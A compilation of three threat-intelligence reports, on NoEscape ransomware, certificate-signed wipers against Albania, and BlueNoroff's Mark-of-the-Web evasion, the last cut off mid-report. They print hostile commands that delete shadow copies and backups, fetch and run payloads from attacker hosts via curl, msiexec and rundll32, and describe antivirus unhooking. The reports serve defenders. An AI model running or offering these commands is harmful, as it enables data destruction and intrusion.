Figure 6 – directory names and file extensions excluded by NoEscape ransomware Encryption To encrypt files in the victim’s system, the ransomware utilizes the “Microsoft Enhanced RSA and AES Cryptographic Provider” libraries.
Within these libraries, the malware leverages various functions from the CryptoAPI, including CryptAcquireContextW(), CryptImportKey(), CryptSetKeyParam(), and CryptEncrypt(). 
By utilizing these functions, the ransomware can employ robust encryption techniques to ensure that the victim’s files are securely locked and inaccessible without the decryption key. 
Figure 7 – File Encryption In the next step, the malware renames the encrypted files with the extension “.CCBDFHCHFD” and replaces them with the original files using the MoveFileExW() API function, as shown below. 
Figure 8 – MoveFileW() API 
The image below illustrates the files that have been encrypted by the NoEscape ransomware after the successful infection on the victim’s machine. 
Figure 9 – Files encrypted by NoEscape Ransomware Delete System Backup & Shadowcopy Additionally, the ransomware runs a series of commands to delete shadow copies and system backups, effectively preventing file recovery attempts.
By executing these commands, the ransomware ensures that alternative copies of the encrypted files are removed, limiting the victim’s ability to restore their files through backup or shadow copy mechanisms. 
CommandsDescriptionwmic SHADOWCOPY DELETE /nointeractiveThis command uses the Windows Management Instrumentation Command-line (WMIC) to delete all shadow copies without user interaction.
It helps remove any remaining shadow copies that may not have been deleted by the other commands.wbadmin DELETE SYSTEMSTATEBACKUP -deleteOldestThis command uses the wbadmin tool to delete the oldest system state backup.
System state backups include critical operating system files, such as the registry, COM+
Class Registration Database, and system files.wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0This command also uses wbadmin to delete all versions of system state backups except the most recent one.
The -keepVersions parameter specifies the number of versions to keep, and 0 means all versions except the latest one will be deleted.wbadmin DELETE BACKUP -deleteOldestThis command utilizes wbadmin to delete the oldest regular backup.
Regular backups typically include user data and other files.wbadmin DELETE BACKUP -keepVersions:0Similar to the previous command, this one deletes all versions of regular backups except the most recent one, based on the -keepVersions parameter.vssadmin Delete Shadows /All /QuietThis command uses the vssadmin tool to delete all shadow copies (also known as volume snapshots) on the system.bcdedit /set {default} recoveryenabled NoThis command uses the bcdedit tool to modify the boot configuration data (BCD) of the default boot entry.
It sets the recoveryenabled option to “No,” which disables the automatic recovery options during system startup.bcdedit /set
{default} bootstatuspolicy ignoreallfailuresThis command also uses bcdedit to modify the boot configuration data.
It sets the bootstatuspolicy option to “ignoreallfailures,” which means the system will ignore any failures encountered during the boot process.
The below figure illustrates the sequence of commands executed by the NoEscape ransomware to delete shadow copies and system backups. 
Figure 10 – Commands executed to delete shadow copies and system backups Ransom Note Finally, the ransom note that is dropped in the system provides victims with instructions on how to establish contact with the NoEscape Ransomware Group to initiate negotiation proceedings regarding the ransom. 
The ransom note serves as a communication channel through which the victims can follow the specified steps to engage with the ransomware operators and negotiate the terms of the ransom payment. 
Figure 11 – NoEscape Ransom note Linux Variant The NoEscape Linux variant consists of three files: “script_linux.sh,” “script_esxi.sh” and “164f8295_linux.elf“. 
Each of these files serves specific purposes and contributes to the overall functionality of the Linux variant of the ransomware. 
Ransomware Targeting Linux Machines The “script_linux.sh” script is designed to facilitate the execution of a ransomware payload “164f8295_linux.elf“.
Its primary purpose is to carry out the encryption process on the victim’s Linux machine by scanning files in a specified or generic path and running the ransomware payload, “164f8295_linux.elf”, on each file it encounters. 
The below figure shows the code snippet “script_linux.sh”. 
Figure 12 – content of script_linux.sh The script “script_linux.sh” executes the following functions: SetLimits() –
This function is responsible for adjusting the resource limits of the running process.
Its purpose is to increase the maximum number of open file descriptors and the maximum number of allowed processes.
By doing so, the function ensures that the script has the capability to handle a larger number of open files and concurrent processes, which is crucial for efficient file encryption in the context of ransomware. 
EmptyTrash() – This function is responsible for deleting all files and directories in the user’s trash folder.
It clears the trash before the ransomware starts encrypting files.
This step is taken to ensure that any previously deleted files in the trash cannot be recovered by the victims.
By emptying the trash, the ransomware eliminates any possibility of file restoration from that location, making the encryption process more effective and irreversible. 
ExecPayload() – 
This function executes the ransomware payload file “164f8295_linux.elf”, by passing the file path to be encrypted as an argument. 
ScanPath(): This function scans a specified path by finding all files within the given directory and its subdirectories.
It then calls ExecPayload() for each file to execute the Ransomware payload, thereby initiating the encryption process. 
WaitPayload(): This function waits until the payload process is no longer running.
It checks the number of running instances of the payload executable and waits until the count becomes zero.
The purpose of waiting for the Ransomware process to finish is to ensure that all files have been encrypted before proceeding to the next steps of the ransomware attack. 
Cleanup() – This function performs cleanup operations after encrypting files in the victim’s machine. 
It removes log files and temporary files from the root directory.
It also deletes the ransomware, script file, and ransom note (index.html), ensuring that no evidence remains on the compromised system. 
Ransomware Targeting Vmware ESXi Servers The “script_esxi.sh” script is designed to automate the execution of ransomware payload “164f8295_linux.elf” on ESXi servers.
It targets specific paths, including NFS volumes and VM volumes, and encrypts files found within those paths. 
The below figure shows the code snippet “script_esxi.sh”. 
Figure 13 – Content of script_esxi.sh The script “script_esxi.sh” executes the following functions: 
StopVMS(): This function stops running virtual machines (VMs) on an ESXi server.
It uses the esxcli command to list all VM processes and forcibly kills them.
It also kills any remaining processes related to VMs. 
ScanNFS(): This function scans NFS (Network File System) volumes on an ESXi server.
It retrieves the list of NFS volumes using esxcli and then iterates over each volume to find files.
For each file found, it calls ExecPayload() to execute the ransomware payload. 
ScanVMS() – This function scans VM volumes on an ESXi server.
It retrieves the list of VM volumes using the esxcli command and then iterates over each volume to search for specific files related to virtual machines.
These file extensions include .nvram,.vmdk,.vmem,.vmsd,.vmsn,.vmss,.vmx,.vmxf, and .vswp.
For each file found, the function calls the ExecPayload() function to execute the ransomware payload for encrypting them. 
Deface() – This function replaces the “index.html” and “motd” files with ransom notes to ensure the ransom alert is displayed to victims upon login. 
Post()-
This function modifies system files such as cron tab entries and configuration files to further disrupt the system and prevent recovery. 
Linux Ransomware Payload: 
The file “164f8295_linux.elf” (Sha256: 21162bbd796ad2bf9954265276bfebea8741596e8fe9d86070245d9b5f9db6da) is responsible for encrypting the files in the victim’s machine. 
Upon execution, the ransomware encrypts files using the chacha20 algorithm.
The Ransomware incorporates a feature to encrypt larger files in smaller chunks.
The TA can mention the file size, which is considered as larger, and the size of encryption in the Ransomware panel while building the binary. 
The below figure shows the code used by ransomware for validating and encrypting larger files. 
Figure 14 – Validating and Encrypting Larger Files Finally, the Ransomware drops a ransom note named “HOW_TO_RECOVER_FILES.txt ” which instructs the victims on how to reach out to the TAs to recover their encrypted files and pay a ransom. 
Figure 15- Ransom Note Conclusion NoEscape RaaS is a new ransomware group that aims to entice new affiliates with the promise of profits.
They are actively seeking affiliates through postings on various dark web forums.
Our analysis of the Windows and Linux malware executables indicates that the malware poses a threat to organizations of all types.
As the group is relatively new, it is likely that they will evolve their tools and tactics to target multiple organizations. 
We will maintain our vigilance in monitoring NoEscape RaaS, their tools, tactics, and procedures, in order to provide regular updates to our customers and readers in the future. 
Our Recommendations We have listed some essential cybersecurity best practices that create the first line of control against attackers.
We recommend that our readers follow the best practices given below: Safety Measures Needed to Prevent Ransomware Attacks Conduct regular backup practices and keep those backups offline or in a separate network Turn on the automatic software update feature on your computer, mobile, and other connected devices wherever possible and pragmatic Use a reputed anti-virus and Internet security software package on your connected devices, including PC, laptop, and mobile Refrain from opening untrusted links and email attachments without verifying their authenticity Users Should Take the Following Steps After the Ransomware Attack Detach infected devices on the same network Disconnect external storage devices if connected Inspect system logs for suspicious events Impact of Ransomware Loss of valuable data Loss of the organization’s reputation and integrity Loss of the organization’s sensitive business information Disruption in organization operation Financial loss MITRE ATT&CK:registered: Techniques Tactic Technique ID Technique Name ExecutionT1059 T1204Command and Scripting Interpreter User ExecutionPersistenceT1547.001 Registry Run Keys / Startup FolderDiscoveryT1083File and Directory DiscoveryDefense EvasionT1070 T1562Indicator Removal Impair DefensesImpactT1486 T1490Data encrypted for impact Inhibit System RecoveryIndicators of Compromise (IOCs) Indicators Indicator Type Description 65f35ae4203cf5041a0aaa358dd3d74c ea1f7940271fc80d06b2f222506020b650ad41bc 68e5caa3f0fd4adc595b1163bf0dd30ca621c5d7a6ad0a20dfa1968346daa3c8MD5
SHA1 SHA2561ce30fbd_dll.dll9ea0d4448472cdeeb290e8006e8b1e9b 30f71a24c15dd81965b12996a79d914acf4f169e 2cd1ca52a5d404176f0ec7debeceb4ba3c95b139061f86ac971195b02d854b0cMD5
SHA1 SHA25606b91e4a_exe.exebd69a645fa69fd8d5ba56b9c3f468711 12dc0a2de3ad30201107bfcb679de5acacf31e5c 68ff9855262b7a9c27e349c5e3bf68b2fc9f9ca32a9d2b844f2265dccd2bc0d8MD5 SHA1 SHA25623cd1f01_exe.exec850f6816459e3364b2a54239642101b
30c60f18279ed5fd36e3ac2d3ba5ddbdc5d1f624 21162bbd796ad2bf9954265276bfebea8741596e8fe9d86070245d9b5f9db6daMD5 SHA1 SHA256164f8295_linux.elf473d65d1231ccdfa0099d463b09cf9b9 9cbc7417fa5ce2f6d87026337fc7892e4f485819 07c70968c66c93b6d6c9a90255e1c81a3b385632c83f53f69534b3f55212ced9MD5
SHA1 SHA256bd83e75f_dllreflinj.dll47ae17d89c2d9b6acdc7458f5df1c6f7 d38c613020cb4616783c8535380e28404f7eaebf 9d346518330eeefbf288aeca7b2b6243bc158415c7fee3f2c19694f0e5f7d51cMD5
SHA1 SHA256ca3ec998_xp.exe34de9725e232ba82275bb0dcf9282e16 b17403e7dcb992ba8d2b56dd843406264d3910e5 aa5a487db37ce176e17c7abbb2b1d460ba926344e46737f2f64b65bf5a4a3e58MD5
SHA1 SHA256script_esxi.sh17d55dc09e2a3f10d4ee45156c2c53f1 317f296131b37a73c9a5d253015821dfdc8b1190 16d9e969457a76874e7452e687a7b6843c65ef75d1a4404d369074ad389f6c38MD5 SHA1 SHA256script_linux.sh 
title: Stolen certificates in two waves of ransomware and wiper attacks url: https://securelist.com/ransomware-and-wiper-signed-with-stolen-certificates/108350/ Introduction On July 17, 2022, Albanian news outlets reported a massive cyberattack that affected Albanian government e-services.
A few weeks later, it was revealed that the cyberattacks were part of a coordinated effort likely intended to cripple the country’s computer systems.
On September 10, 2022, Albanian local news reported a second wave of cyberattacks targeting Albania’s TIMS, ADAM and MEMEX systems – the latter two systems critical for law enforcement – reportedly using the same attack type and by the same actors. 
Around the same time, we identified ransomware and wiper malware samples resembling those used in the first wave, though with a few interesting modifications that likely allowed evasion of security controls and better attack speeds.
Chief among those changes are the embedding of a raw disk driver, providing direct hard disk access inside the malware itself, modified metadata, and the use of Nvidia’s leaked code signing certificate to sign the malware. 
So, what’s new in this blogpost? 
We compare the first and second waves of ransomware and wiper malware used to target Albanian entities and detail connections with previously known ROADSWEEP ransomware and ZEROCLEARE variants. 
The threat actors used certificates from Nvidia and Kuwait Telecommunications Company to sign their malware; the former was already leaked, but we’re not sure how they got their hands on the latter. 
We identified potential cooperation between different attack groups speaking different languages, and the possible use of AnyDesk as an initial entry point to start the ransomware/wiper infections. 
The changes implemented to automate and speed up wiping in the second wave of attacks are reminiscent of the notorious Shamoon wiper attacks in the Middle East. 
Wiper and ransomware, comparing wave 1 and wave 2 Below, we compare and discuss the differences between the wave 1 and wave 2 ransomware and wiper malware. 
Initial Infection – traces of cooperation between different attack groups and use of AnyDesk utility 
Although we weren’t able to identify the initial entry point of the threat actor in the analyzed intrusion, a few days after the second wave wiping activities, we noticed underground chatter about someone having access to an AnyDesk account at another non-governmental but significant Albanian entity, and suggestions for Persian-speaking hackers to use it for deploying ransomware or wiper malware.
This may increase the likelihood that the initial entry point for wave 2 is through legitimate remote access software such as AnyDesk, especially since we know that the wave 2 wiper modifications included automatic execution upon driver installation only – potential need for urgency due to the limited time/access window.
The attackers and access provider seemed to belong to different attack groups and spoke different languages. 
The ransomware – use of Kuwait Telecommunications Company signing certificate MD5 96eabcc77a6734ea8587599685fbf1b4 SHA1 6a36962709abbfc1f88f87e7fe88a417302bfe43 SHA256 8ad01b028e6aa711d26879d346a7bef82516e372e0f14e8e69db6aef0f25d992 Imphash 653ee44c85bc91d12ec33dfed8056c27 Link time Wed Jul 06 21:30:41 2016 File type 32-bit executable Compiler MinGW-w32 gcc File size 45.48 KB File name PdftoDoc.exe This second wave sample has the same signing certificate parameters as the first wave sample, which is related to Kuwait Telecommunications Company.
It’s unclear how the threat actor was able to sign its malware using Kuwait Telecommunications Company’s certificate, but we suspect it was stolen.
As of the date of this publication, the certificate is no longer valid and has been revoked. 
After the initial execution, the wave 2 ransomware checks for any six arguments (or more) supplied by the threat actor, as opposed to the wave 1 sample that checks for five arguments or more – a small modification that assists in defense evasion.
Nevertheless, the intrusion analysis conducted on one of the affected machines indicates that in wave 2 the threat actor did not use a BAT file to invoke the ransomware while supplying seven digits similar to wave 1, but instead invoked the wave 2 ransomware immediately from the command line using six zeroes: “000000”.
If ransomware execution fails because the correct arguments are not supplied, the wave 2 sample displays a different message from that of wave 1; the wave 2 message resembles an error message displayed by a PDF to DOC converter. 
Wave 1 sample – messaging after failed execution Wave 2 sample – different messaging after failed execution The wave 2 ransomware sample continues execution and checks for the mutex Screenlimitsdevices#77!;, a value that differs from the wave 1 sample’s mutex:abcdefghijklmnoklmnopqrstuvwxyz01234567890abcdefghijklmnopqrstuvwxyz01234567890 Although we call this malware ransomware based on its behavior, the encrypted files are, in fact, unrecoverable.
When comparing wave 2 ransomware samples to wave 1, we notice that both have the same , and both use CreateFile and WriteFile APIs to overwrite files.
During the process of execution, wave 2 ransomware attempts to decrypt and execute embedded scripts, malware settings or API function names.
The encryption algorithm used is RC4 in both wave 1 and wave 2.
However, the RC4 key for decryption in wave 2 has been changed in another attempt to evade detection. 
Wave 1 RC4 key: 8C E4 B1 6B 22 B5 88 94 AA 86 C4 21 E8 75 9D F3 Wave 2 RC4 key: F0 B4 ED D9 43 F5 C8 43 C9 D0 A2 4F 22 9B BC 3A It’s worth noting that in both waves, the RC4 decryption method uses CryptoAPI (CryptDecrypt) instead of the usual substitution box method.
The intrusion we analyzed in wave 2 indicates that the ransomware was probably deployed over the internal network, possibly from another compromised machine.
This is reinforced by the fact that we didn’t see anything else dropped or executed before the ransomware execution, and the ransomware executable name was randomly generated, potentially by the tool the threat actor used to deploy it over the network (e.g., Mellona.exe). 
Despite all the changes made in the wave 2 ransomware, the ransom notes remained the same and included political messaging that reflects the geopolitical tensions between Albania and Iran. 
Ransom note in both wave 1 and wave 2 ransomware The wiper – use of Nvidia signing certificate MD5 64cb923be15ae255b82e7ebcf24ccfc5 SHA1 e1b8b72fbd1e3b9bbf8bebd2e14a3f2e071c6048 SHA256 d8ec8ec8dfa582c44e81b8a7fcc44defc3d2fa658f75fa495124aedc3b0db367 Imphash 81CA8B811412284938148FC4F2A76C09 Link time 0x6319C758 (Thu Sep 08 03:43:36 2022) 
File type PE 64-bit Compiler Microsoft Visual C/C++ File size 174.00 KB File name DiskSnapshot.exe Driver PDB path c:\projects\rawdisk\bin\wnet\fre\amd64\rawdsk3.pdb Driver key B4B615C28CCD059CF8ED1ABF1C71FE03C0354522990AF63ADF3C911E2287A4B906D47D Similar to the wave 2 ransomware sample, the threat actor made several modifications to the wave 2 wiper malware, probably to evade detection.
The three main changes are: Modified malware signing Embedding of EldoS RawDisk driver inside the wiper malware Automatic wiping after driver installation command Historically, in ZEROCLEARE and DUSTMAN incidents from 2019, the wiper malware and raw disk drivers were not signed and therefore could not directly access the raw disk for speedy data wiping.
So, the wipers had to use a third-party loader such as TDL – a signed loader for unsigned drivers – to install the unsigned raw disk driver that allows the wiper malware to directly access the raw disk for wiping data using DeviceControl API methods.
However, in the first attack wave targeting Albania, the threat actor signed the wave 1 wiper using the Kuwait Telecommunications Company certificate, thus removing the need for a third-party loader.
The speed and automation improvements remind us of previous Shamoon operations in the Middle East. 
Since the wave 1 wipers were exposed in July 2022, and likely to avoid static detections, the threat actor used Nvidia’s leaked signing certificate to sign the wave 2 wiper in September 2022, again eliminating the need for a third-party loader for the raw disk driver. 
In wave 1, the wiper malware expected to find the raw disk driver in the execution directory or in the system directory.
The driver wasn’t dropped by the wiper, and the threat actor likely dropped it using other means.
Conversely, in wave 2 the threat actor embedded the signed raw disk driver in the wiper executable, dropped it and then installed it.
In addition, the driver being used by the threat actor in wave 2 seems to copy metadata and a few functions from Microsoft’s diskdump.sys crash dump driver[1] (version 10.0.19041.1682) as another means to avoid detections.
The wiping activity starts automatically after the driver installation command; as opposed to the wave 1 wiper, where installation is one step and wiping execution is a second step. 
Finally, for the most part, wave 1 and wave 2 wipers remained the same, including the reliance on the same authentication key to access the raw disk driver, and the use of the same DeviceControl API methods, but with one exception, as shown below.
It’s worth noting that the method IOCTL_DISK_GET_LENGTH_INFO is exclusive to all Persian-speaking APT wipers. 
Wave 1 wiper DeviceControl API methods: IOCTL_DISK_GET_DRIVE_GEOMETRY_EX IOCTL_DISK_GET_DRIVE_GEOMETRY IOCTL_DISK_GET_LENGTH_INFO Wave 2 wiper DeviceControl API methods: IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS (new method in wave 2; used in multiple instances) IOCTL_DISK_GET_DRIVE_GEOMETRY IOCTL_DISK_GET_LENGTH_INFO Based on our telemetry, we suspect the infections are associated with law enforcement institutions in Albania.
This targeting is consistent with the previous wave of cyberattacks affecting the Albanian government during the July 2022 wave of cyberattacks. 
Conclusions In this publication, we discussed the changes made to the second wave of ransomware and wiper samples that targeted Albanian institutions to evade detection and inflict maximum damage. 
Aside from the changes made to evade detection in wave 2, we suspect that the threat actors needed an automated and speedy wiper execution.
In wave 2, the raw disk driver was embedded inside the malware and the wiping routine started immediately after driver installation, as opposed to the wave 1 procedure.
This is reminiscent of Shamoon operations in the Middle East. 
Finally, for defenders we can highlight two important elements from the intrusion and malware analysis presented here: Monitor for remote software activities such as AnyDesk for unauthorized use Always hunt and monitor for expired and/or leaked signing certificates as they can be used by threat actors to load and execute malware Threat detection 
The detection logic has been improved in all our solutions to ensure that our customers remain protected.
We continue to investigate this threat using our Threat Intelligence and we will add additional detection logic once they are available. 
Our products protect against this threat and detect it with the following names: 
HEUR:Trojan-Ransom.
Win32.Agent.gen Trojan-Ransom.Win32.Gen.aghh Trojan-Ransom.Win64.Agent.dpf Trojan.Win32.Agentb.kzkj Indicators of compromise File hashes (malicious documents, Trojans, emails, decoys) Ransomware Wiper Driver Signing certificates serial numbers 14 78 1B C8 62 E8 DC 50 3A 55
93 46 F5 DC C5 18 Nvidia certificate 01 FD D0 93
F6 50 87 F4 E9 AE 11 ED 65 0D 83 E8 Kuwait Telecommunications company certificate [1] Original, legitimate driver’s MD5 is 015caeec9148194054b5b1de64762a43 
title: BlueNoroff introduces new methods bypassing MoTW url: https://securelist.com/bluenoroff-methods-bypass-motw/108383/ BlueNoroff group is a financially motivated threat actor eager to profit from its cyberattack capabilities.
We have published technical details of how this notorious group steals cryptocurrency before.
We continue to track the group’s activities and this October we observed the adoption of new malware strains in its arsenal.
The group usually takes advantage of Word documents and uses shortcut files for the initial intrusion.
However, it has recently started to adopt new methods of malware delivery. 
The first new method the group adopted is aimed at evading the Mark-of-the-Web (MOTW) flag, the security measure whereby Windows displays a warning message when the user tries to open a file downloaded from the internet.
To do this, optical disk image (.iso extension) and virtual hard disk (.vhd extension) file formats were used.
This is a common tactic used nowadays to evade MOTW, and BlueNoroff has also adopted it. 
In addition, the group tested different file types to refine malware delivery methods.
We observed a new Visual Basic Script, a previously unseen Windows Batch file, and a Windows executable.
It seems the actors behind BlueNoroff are expanding or experimenting with new file types to convey their malware efficiently. 
After researching the infrastructure that was utilized, we discovered more than 70 domains used by this group, meaning they were very active until recently.
Also, they created numerous fake domains that look like venture capital and bank domains.
Most of the domains imitate Japanese venture capital companies, indicating that the group has an extensive interest in Japanese financial entities. 
Executive summary BlueNoroff group introduced new file types to evade Mark-of-the-Web (MOTW) security measures; BleuNoroff group expanded file types and tweaked infection methods; BlueNoroff created numerous fake domains impersonating venture capital companies and banks. 
Background At the end of September 2022, we observed new BlueNoroff malware in our telemetry.
After a careful investigation, we confirmed that the actor had adopted new techniques to convey the final payload.
The actor took advantage of several scripts, including Visual Basic Script and Windows Batch script.
They also started using disk image file formats, .iso
and .vhd, to deliver their malware.
For intermediate infection, the actor introduced a downloader to fetch and spawn the next stage payload.
Although the initial intrusion methods were very different in this campaign, the final payload that we had analyzed previously was used without significant changes. 
Novel infection chain Long-lasting initial infection Based on our telemetry, we observed that one victim in the UAE was attacked using a malicious Word document.
The victim received a document file named “Shamjit Client Details Form.doc” on September 2, 2022.
Unfortunately, we couldn’t acquire the document, but it was executed from the following path: C:\Users\[username]\Desktop\SALES
OPS
[redacted]\[redacted]\Signed Forms & Income Docs\Shamjit
Client Details Form.doc Judging from the file path, we can assume that the victim was an employee in the sales department responsible for signing contracts. 
Upon launch, the malicious document connects to the remote server and downloads the payload.
In this particular case, the executable ieinstal.exe was used to bypass UAC. 
Remote URL: https://bankofamerica.us[.]org/lsizTZCslJm/W+Ltv_Pa/qUi+KSaD/_rzNkkGuW6/cQHgsE= Created payload path:
%Profile%\cr.dat Spawned command: cmd.exe %Profile%\cr.dat 5pKwgIV5otiKb6JrNddaVJOaLjMkj4zED238vIU= After initial infection, we observed several keyboard hands-on activities by the operator.
Through the implanted backdoor, they attempted to fingerprint the victim and install additional malware with high privileges.
Upon infection, the operator executed several Windows commands to gather basic system information.
They then returned 18 hours later to install further malware with high privileges. 
Post-exploitation Based on our telemetry, when the malicious Word document opens it fetches the next payload from the remote server: Download URL: http://avid.lno-prima[.]lol/VcIf1hLJopY/shU_pJgW2Y/KvSuUJYGoa/sX+Xk4Go/gGhI= The fetched payload is supposed to be saved in %Profile%\update.dll.
Eventually, the fetched file is spawned with the following commands: Command #1:
rundll32.exe %Profile%\update.dll,#1 5pOygIlrsNaAYqx8JNZSTouZNjo+j5XEFHzxqIIqpQ== Command #2:
rundll32.exe %Profile%\update.dll,#1 5oGygYVhos+IaqBlNdFaVJSfMiwhh4LCDn4= 
One of the other methods the BlueNoroff group usually uses is a ZIP archive with a shortcut file.
The archive file we recently discovered contained a password-protected decoy document and a shortcut file named “Password.txt.lnk“.
This is a classic BlueNoroff strategy to persuade the victim to execute the malicious shortcut file to acquire the decoy document’s password.
The latest archive file (MD5 1e3df8ee796fc8a13731c6de1aed0818) discovered has a Japanese file name, 新しいボーナススケジュール.zip (Japanese for “New bonus schedule”), indicating they were interested in Japanese targets. 
The main difference from the previous shortcut sample was that it fetched an additional script payload (Visual Basic Script or HTML Application); also, a different method of fetching and executing the next stage payload was adopted at this time.
The command below was executed when the victim double-clicked on the shortcut file:cmd.exe /c DeviceCredentialDeployment & echo jbusguid> %APPDATA%\Pass.txt & start %APPDATA%\Pass.txt && FOR %i IN (%systemroot%\system32\msiexec.*)
DO msiexec -c /Q /i 
hxxps://www.capmarketreport[.]com/packageupd.msi?ccop=RoPbnVqYd & timeout To evade detection, the actor utilized Living Off the Land Binaries (LOLBins).
The DeviceCredentialDeployment execution is a well-known LOLBin used to hide the command’s windows.
The actor also abused the msiexe.exe file to silently launch the fetched Windows Installer file. 
Updated method #1: Tricks to evade MOTW flag We observed that the actor examined different file types to deliver their malware.
Recently, many threat actors have adopted image files to avoid MOTW (Mark-of-the-Web).
In a nutshell, MOTW is a mitigation technique introduced by Microsoft.
The NTFS file system marks a file downloaded from the internet, and Windows handles the file in a safe way.
For example, when a Microsoft Office file is fetched from the internet, the OS opens it in Protected View, which restricts the execution of the embedded macro.
In order to avoid this mitigation technique, more threat actors have started abusing ISO file types.
The BlueNoroff group likely experimented with ISO image files to deliver their malware.
Although it’s still under development, we mention this sample as an early warning.
This ISO image file contains one PowerPoint slide show and one Visual Basic Script. 
Embedded files of ISO image The Microsoft PowerPoint file contains a link.
When the user clicks the link, it executes the 1.vbs file through the WScript process.
When we checked the VBS file, it only generated an “ok” message, which suggests BlueNoroff is still experimenting with this method.<?xml version="1.0" encoding="UTF-8" standalone="yes"?> <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="wscript%201.vbs" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1.xml"/></Relationships> Based on our other findings, we discovered an in-the-wild sample (MD5 a17e9fc78706431ffc8b3085380fe29f) from VirusTotal.
At the time of analysis, this .vhd sample wasn’t detected by any antivirus.
The virtual disk file contains a decoy PDF file, Windows executable file, and an encrypted Dump.bin file.
The PDF and executable files have numerous spaces before the file extension to hide it and allay suspicions. 
Files inside VHD a file The Job_Description[spaces].exe file (MD5 931d0969654af3f77fc1dab9e2bd66b1) is a loader that loads the next stage payload.
Upon launch, it copies the ​Dump.bin file to the ​%Templates%\war[current time][random value].bin (i.e., war166812964324445.bin).
The Dump.bin has a modified PE header.
The malware reads the first byte of Dump.bin, 0xAF in this file, and decodes 0x3E8 bytes with that key.
The decrypted data is the header of a PE file, overwriting the recovered header to the original file.
Eventually, it loads the decrypted DLL file by spawning the ordinary first export function. 
The spawned downloader contains an encrypted configuration at the end of the file.
The malware first acquires the total size of the configuration data and the length of the payload URL from the end of the file.
They are located four bytes and eight bytes from the end of the file, respectively.
The malware decrypts the configuration data with the RC4 algorithm using an embedded 64-byte key. 
RC4 key: 46 61 44 6D 38 43 74 42 48 37 57 36 36 30 77 6C 62 74 70 79 57 67 34 6A 79 4C 46 62 67 52 33 49 76 52 77 36 45 64 46 38 49 47 36 36 37 64 30 54 45 69 6D 7A 54 69 5A 36 61 42 74 65 69 67 50 33 Restored URL: hxxps://docs.azure-protection[.]cloud/EMPxSKTgrr3/2CKnoSNLFF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3D Structure of configuration In the case of another downloader, however, the payload URL was delivered using a command line parameter.
Also, some of the other downloaders (MD5 f766f97eb213d81bf15c02d4681c50a4) have functionality that checks the working environment.
If the size of physical memory is less than 2,147,483,648 bytes, the malware terminates execution. 
Infection flow of downloader This downloader checks for the names of the following antivirus vendors:
Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender.
If TrendMicro, BitDefender, or Windows Defender products are installed, the malware conducts a classic unhooking DLL trick intended to remove user-mode hooks from the system library.
This evasion technique overwrites the .text section of the pre-loaded ntdll library with the freshly loaded one so that the hooked API addresses are recovered with the original API address.
With this trick, the malware can disable the functionalities of EDR/AV products.
Next, the malware creates a mutex to avoid duplicate execution. 
Mutex name: da9f0e7dc6c52044fa29bea5337b4792b8b873373ba99ad816d5c9f5f275f03f Next, the malware opens a PDF decoy document in the same directory.
The decoy document masquerades as a job offer from a Japanese multinational bank. 
If Windows Defender or Bitdefender Antivirus is installed on the victim’s computer, the malware executes itself with the following commands: Windows Defender: cmd /c
timeout /t 10 & Del /f /q
\”[current file name]\” & attrib -s
-h \”[PDF decoy file]\” & rundll32 \”[current DLL file path]\” #1 Bitdefender: cmd /c
timeout /t 10 & rundll32 \”[current DLL file path]\” #1 The primary objective of this malware is to fetch the next stage payload.
To do this, the malware uses the cURL library, combining cURL commands depending on the antivirus installed. Avira or Avast installed:
curl -A cur1-agent -L
[payload URL(| -x proxy URL)]
-s -d da Other cases: curl -A cur1-agent -L
-s -d dl Note that the user-agent name is “cur1-agent“, and the malware sends “da” POST data if the victim installed Avira or Avast; otherwise, the malware sends “dl” POST data.
If the fetched data by cURL command contains “<html>” and “curl:”, the malware decrypts the payload with a delivered 64-byte RC4 key. 
If Avira or Avast are installed, the malware saves the decrypted payload to “%TEMPLATES%\marcoor.dll” and spawns it with the rundll32.exe command with the payload URL. 
command: exe %TEMPLATES%\marcoor.dll #1 [payload URL] Otherwise, the malware doesn’t write the payload to the file and injects the fetched payload into the explorer.exe process.
The fetched payload is a DLL type executable and its export function is spawned with the “payload URL”. 
Unfortunately, we haven’t been able to obtain a precise infection chain so far.
From our telemetry, however, we can confirm the victim was eventually compromised by backdoor-type malware.
Based on the malware’s static information, and parts of the internal code, we assess that the final payload is still very similar to the Persistence Backdoor #2[1] we described in our previous blog. 
Updated method #2: Scripts and novel downloader 
Additionally, we observed the download and launch of a suspicious batch file.
The actor exploited different LOLBins.
The malware execution is done using a legitimate script, SyncAppvPublishingServer.vbs, in the system folder.
This script is for executing the PowerShell script via
a Windows scheduled task.WScript.exe "%system32%\SyncAppvPublishingServer.vbs" "n;cmd.exe '/c curl perseus.bond/Dgy_0dU08lC/hCHEdlDFGV/P89bXhClww/uiOHK5H35B/bM%3D -A cur1-agent -o %public%\regsile.bat & start /b
%public%\regsile.bat' 
We also observed the context around that batch file in our telemetry.
The batch file name is “What is Blockchain.bat“.
As the file name suggests, this group still targets the blockchain industry.
We acquired the scriptlet of the batch file.xcopy /h
/y /q
How-To-Extension.pdf c:\users\public\Inproc.exe* start xcopy
/h
/y
/q
Blockchain-old.pdf c:\users\public\rwinsta.exe* start c:\users\public\Inproc.exe "%cd%\Blockchain.pdf" The Inproc.exe is a legitimate mshta.exe file (MD5 0b4340ed812dc82ce636c00fa5c9bef2), and the rwinsta.exe is a legitimate rundll32.exe file (MD5 ef3179d498793bf4234f708d3be28633).
The Blockchain.pdf file is a malicious HTML application file spawned by the mshta.exe process.
Unfortunately, we don’t have the HTA script (Blockchain.pdf), but we can assume the functionality of the script based on our telemetry – showing the decoy document and fetching the next stage payload.
# Create a decoy password file and open it. 
cmd.exe" /c
echo {PASSWORD}>%documents%\Userlink & notepad.exe %documents%\Userlink # Fetch the payload with cURL command and execute. cmd.exe" /c
timeout 10 & curl perseus.bond/VcIf1hLJopY/shU_pJgW2Y/NX4SoGYuka/iiOHK5H35B/bM%3D -s -d md -A cur1-agent -o %documents%\macroor.dll& %documents%\macroor.dll #1 perseus.bond/VcIf1hLJopY/shU_pJgW2Y/NX4SoGYuka/iiOHK5H35B/bM%3D Also, we observed this group introduce a new Windows executable-type downloader at this time.
